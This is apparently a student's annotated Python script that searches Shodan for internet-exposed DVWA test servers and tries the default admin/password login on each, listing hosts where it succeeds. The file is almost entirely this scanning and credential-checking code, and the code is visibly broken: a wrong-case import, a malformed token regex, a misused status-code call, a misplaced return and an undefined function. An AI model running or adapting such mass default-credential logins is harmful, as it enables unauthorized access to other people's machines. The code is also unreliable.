


#Code did not run even though shodan was imported and code run in virtual environment 
#Some parts after line 49 where clearly understood


#A
from unittest import result
import Shodan
import time
import requests
import re

#B
Key=input("Enter your Shodan API key \n")
api_object=Shodan.Shodan(Key)


#C
def get_page_from_shodan(query,page=1):

    while True:
        try:
            instances=api_object.search(query,page=page)
            return instances
        except Shodan.APIError as e:
            print(f" Error :  {e}")
            time.sleep(5)


#D

def credentials_validation(instance):
    s=requests.session()
    p=('ssl' in instance) and 'https' or 'http'  

    try:
        response=s.get(f"{p}://{instance['ip_str']}:{instance['port']}/login.php",verify=False)
    
    except requests.exceptions.ConnectionError:
        return False
    

    if response.status_code!=200:
        print(f" [-] Got HTTP status code {response.status_code()}, expected 200  \n")
        return False
    
    #E  :THIS part was not well understood
    token=re.search(r"user_token value='([0-9a-f]+'", response.text).group(1)
    
    response=s.post(f"{p}://{instance['ip_str']}:{instance['port']}/login.php",
        f"username=admin&password=password&user_token={token}&Login=Login",
        allow_redirects=False,
        verify=False,
        headers={'Content-Type': 'application/x-www-form-urlencoded'})
    
    #F

    if response.status_code==302 and response.headers['Location']=='index.php':
        return True
    else:
        return False


#G
def process_page(page):
    result=[]

    for instance in page['matches']:

        if credentials_validation(instance):
            print(f" [+]  valid credentials at  :   {instance['ip_str']} : {instance['port']}")
            result.append(instance)
        
        return result

#H
def Query_shodan(query):
    print("[*] querying the first page")
    first_page = get_page_from_shodan(query)   
    total = first_page['total']
    already_processed = len(first_page['matches'])
    result = process_page(first_page)
    page = 2
    while already_processed < total:   #Number of pages already checked
        # break just in your testing, API queries have monthly limits   ????????????????????????????
        break
        print("querying page {page}")
        page = request_page_from_shodan(query, page=page)
        already_processed += len(page['matches'])
        result += process_page(page)
        page += 1
    return result

# search for DVWA instances
res = Query_shodan('title:dvwa')
print(res)









